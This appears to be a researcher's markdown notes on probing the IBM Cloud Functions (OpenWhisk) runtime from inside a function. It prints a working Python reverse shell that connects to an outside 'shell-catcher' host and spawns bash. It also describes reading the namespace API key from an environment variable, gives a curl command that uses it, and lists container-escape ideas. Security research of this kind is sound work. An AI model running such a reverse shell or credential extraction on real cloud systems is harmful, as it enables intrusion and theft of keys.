# IBM Cloud Functions

Exploring the IBM Cloud Functions service and the internal environment for the functions using a reverse shell.

## Observations

- IBM Cloud Functions is based on Apache OpenWhisk
- A reverse shell gave additional information on network services and container capabilities

### Setting up a reverse shell

- The following python code was used as the function base code and trigger timeout was increased to 600 seconds
- `<shell-catcher>` was an AWS EC2 with a public IP, with its Security Group open to port 9090

```python
import sys
import socket,subprocess,os

def main(dict):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("<shell-catcher>",9090))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])
    return 'Exiting..'
```

### What's inside the function

- Reverse shell lands us in the `/action/1/bin` directory, working directory of the code being executed

![IBM Cloud Reverse shell into function](images/ibmcloud-reverse-shell-function.png)

- No network tools present, so installed using `apt update && apt install net-tools`
- A REST service listens on port 8080 hosted by `/bin/proxy` (OpenWhisk ActionLoop Proxy v1.17.1)
- This is where CVE-2018-11756 and CVE-2018-11757 were discovered that allowed overwriting of the function code by using a POST request to the `/init` endpoint
- Cloud Foundry based namespace key can be pulled from the environment variable `__OW_API_KEY`. Key can be used to trigger the function as a REST API endpoint
- `curl -u $API_KEY -X POST https://eu-gb.functions.cloud.ibm.com/api/v1/namespaces/riyazwalikar%40gmail.com_dev/actions/ibm-demo-function-package/ibm-demo-function?blocking=true`

## To do

1. Check if any of the current container capabilities can be abused to attempt to escape of make network calls
2. Current capabilities: `cap_chown`, `cap_dac_override`, `cap_fowner`, `cap_setgid`, `cap_setuid`, `cap_audit_write`
3. Research the OpenWhisk REST API interface to find potential issues that can be abused
4. Test other known container escape techniques

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
- [https://web.archive.org/web/20180815225124/https://www.puresec.io/blog/Apache_OpenWhisk_Mutability_Weakness?hs_preview=EpJUmSoY-5972289702](https://web.archive.org/web/20180815225124/https://www.puresec.io/blog/Apache_OpenWhisk_Mutability_Weakness?hs_preview=EpJUmSoY-5972289702)
- [https://web.archive.org/web/20180806222002/https://www.puresec.io/hubfs/Apache%20OpenWhisk%20PureSec%20Security%20Advisory.pdf](https://web.archive.org/web/20180806222002/https://www.puresec.io/hubfs/Apache%20OpenWhisk%20PureSec%20Security%20Advisory.pdf)
